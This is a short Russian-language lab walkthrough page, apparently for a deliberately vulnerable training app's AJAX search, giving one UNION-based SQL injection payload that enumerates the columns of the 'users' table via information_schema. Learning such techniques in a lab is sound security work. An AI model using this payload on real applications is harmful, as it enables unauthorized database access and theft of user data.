---
title: SQL_Injection_AJAXJSONjQuery
sidebar_position: 1
---

# SQL Injection (AJAX/JSON/jQuery)

**(low)**


В приложении используется функция поиска AJAX, которая динамически отображает результаты по мере ввода пользователем данных в поле поиска.

Поэтому используем строку ниже для просмотра списка пользователей:
```bash
' UNION SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL from information_schema.columns where table_name='users' -- #
```
![Dumping columns](images/SQL_Injection_AJAXJSONjQuery_img_1.png)